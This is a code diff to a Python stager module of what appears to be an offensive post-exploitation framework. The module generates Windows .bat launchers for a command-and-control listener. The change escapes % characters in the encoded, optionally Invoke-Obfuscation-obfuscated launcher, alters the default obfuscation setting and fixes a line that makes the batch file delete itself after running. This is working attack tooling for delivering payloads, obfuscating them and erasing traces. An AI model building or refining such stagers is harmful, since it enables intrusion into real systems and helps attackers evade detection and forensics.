@@ -53,7 +53,7 @@ class Stager:
             'ObfuscateCommand' : {
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
-                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
+                'Value'         :   r'Token\All\1'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -100,8 +100,8 @@ class Stager:
         if obfuscate.lower() == "true":
             obfuscateScript = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        # generate the launcher code including escapes for % characters needed for .bat files
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries).replace("%", "%%")
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
@@ -112,6 +112,6 @@ class Stager:
 
             if delete.lower() == "true":
                 # code that causes the .bat to delete itself
-                code += "start /b \"\" cmd /c del \"%~f0\"&exit /b\n"
+                code += "start /b \"\" cmd /c del \"%%~f0\"&exit /b\n"
 
             return code
